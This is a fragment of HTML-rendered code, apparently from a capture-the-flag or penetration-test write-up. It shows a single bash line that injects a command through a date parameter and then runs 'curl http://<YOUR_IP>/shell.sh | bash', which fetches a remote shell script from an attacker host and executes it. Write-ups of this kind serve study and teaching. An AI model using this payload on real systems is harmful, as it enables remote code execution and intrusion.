&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">date&lt;/span>&lt;span class="o">=&lt;/span>2023-09-15&lt;span class="p">;&lt;/span>curl http://&amp;lt;YOUR_IP&amp;gt;/shell.sh &lt;span class="p">|&lt;/span>bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="user">
&lt;a href="#user">#&lt;/a>
User
